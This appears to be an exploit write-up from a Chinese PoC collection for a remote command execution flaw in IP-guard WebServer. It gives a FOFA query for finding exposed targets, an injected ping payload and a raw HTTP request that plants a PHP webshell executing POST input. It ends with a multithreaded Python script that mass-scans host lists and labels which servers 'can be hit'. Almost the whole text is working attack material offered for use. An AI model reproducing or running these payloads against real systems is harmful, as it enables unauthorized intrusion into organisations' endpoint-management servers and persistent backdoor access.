## IP-guard WebServer 远程命令执行漏洞
IP-guard是由溢信科技股份有限公司开发的一款终端安全管理软件，旨在帮助企业保护终端设备安全、数据安全、管理网络使用和简化IT系统管理。

## 影响版本
```
< IP-guard WebServer 4.81.0307.0
```

## fofa
```
"IP-guard" && icon_hash="2030860561"
```

## poc
```
/ipg/static/appr/lib/flexpaper/php/view.php?doc=11.jpg&format=swf&isSplit=true&page=||ping%20dnslog
```

## 写php
```
GET /ipg/static/appr/lib/flexpaper/php/view.php?doc=1.jpg&format=swf&isSplit=true&page=||echo+^<?php+@mb_eregi_replace('.*',$_POST['a'],'','ee');?^>+>1.php HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

## 漏洞复现

![](./assets/20231109165256.png)
![](./assets/20231109165333.png)

## Python脚本
```python
#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# fofa:"IP-guard" && icon_hash="2030860561"
# 


import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor
import time

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+-------------------------------------------------------------------------------------------------- -------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                       +')
    print(
        '+ EXP: python3 Ip_Guard_Webserver_View_Rce_Poc.py url.txt                                                  +')
    print(
        '+-------------------------------------------------------------------------------------------------- --------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8080'
} 
def poc(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate, br",
        "Host":"%s" % host2
    }
    vulurl = url + "/ipg/static/appr/lib/flexpaper/php/view.php?doc=11.jpg&format=swf&isSplit=true&page=||ping%20www.baidu.com"
    try:
        start_time = time.time()
        r = requests.get(vulurl, headers=headers)
        end_time = time.time()
        response_time = end_time - start_time
        if r.status_code==200 and response_time >2 and response_time<6 :
            print(host+" :一定能打")
        elif r.status_code==200:   
            print(host+" :大概率能打")
        else:
            print(host+" :不能打")
    except:
        return 0
        print (host+":false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(poc, row[0])
```
